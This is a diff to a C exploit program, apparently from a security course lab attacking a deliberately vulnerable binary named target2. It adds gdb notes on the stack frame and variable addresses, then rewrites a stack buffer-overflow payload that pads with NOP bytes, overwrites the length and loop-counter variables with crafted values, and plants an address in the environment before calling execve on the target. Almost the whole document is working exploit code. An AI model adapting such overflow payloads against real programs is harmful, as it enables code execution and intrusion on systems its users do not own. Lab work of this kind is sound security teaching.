@@ -6,6 +6,37 @@
 
 #define TARGET "../targets/target2"
 
+
+/*      (gdb) info frame [foo]
+        Stack level 0, frame at 0x2021ff00:
+        rip = 0x400c25 in foo (target2.c:11); saved rip = 0x400dbf
+        called by frame at 0x2021ff30
+        source language c.
+        Arglist at 0x2021fef0, args: arg=0x7fffffffe981 "test"
+        Locals at 0x2021fef0, Previous frame's sp is 0x2021ff00
+        Saved registers:
+        rbp at 0x2021fef0, rip at 0x2021fef8
+
+        (gdb) p &buf
+        $1 = (char (*)[256]) 0x2021fde0
+        //decimal: (539098592)
+
+        (gdb) p &len
+        $2 = (int *) 0x2021fee8
+        //decimal: (539098856)
+
+        (gdb) p &i
+        $3 = (int *) 0x2021feec
+        //decimal: (539098860)
+        
+        The environment variables are stored in the top of the stack when the
+        program is started, any modification by setenv() are then allocated
+        elsewhere.  The stack at the beginning then looks like this:
+
+
+              <strings><argv pointers>NULL<envp pointers>NULL<argc><argv><envp>
+*/
+
 int
 main ( int argc, char * argv[] )
 {
@@ -38,19 +69,19 @@ main ( int argc, char * argv[] )
     for (; i < 264; i++)
         buf[i] = '\x90';
 
-    // write '284' to len starting at buf[264]
-    for (; i < 268; i = i+4) {
+    // write '283' to len starting at buf[264]
     for (; i < 268; i = i+4) {
         buf[i+3] = '\x90';
-        buf[i+2] = '\x90';
+        buf[i+2] = '\x00';
         buf[i+1] = '\x01';
-        buf[i]   = '\x1c';
+        buf[i]   = '\x1b';
     }
+   // buf[267] = '\x00';
 
-    // write '268' to i starting at buf[268]
+    // write '264' to i 
     for (; i < 272; i = i+4) {
-        buf[i+3] = '\x90';
-        buf[i+2] = '\x90';
+        buf[i+3] = '\x00';
+        buf[i+2] = '\x00';
         buf[i+1] = '\x01';
         buf[i]   = '\x0c';
     }
@@ -66,7 +97,8 @@ main ( int argc, char * argv[] )
 
     args[1] = buf;
 	args[2] = NULL;
-	env[0] = NULL;
+	//env[0] = '\x00';
+    env[0] = "\x0c\x01\x90\x90\xe0\xfd\x21\x20";
 
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
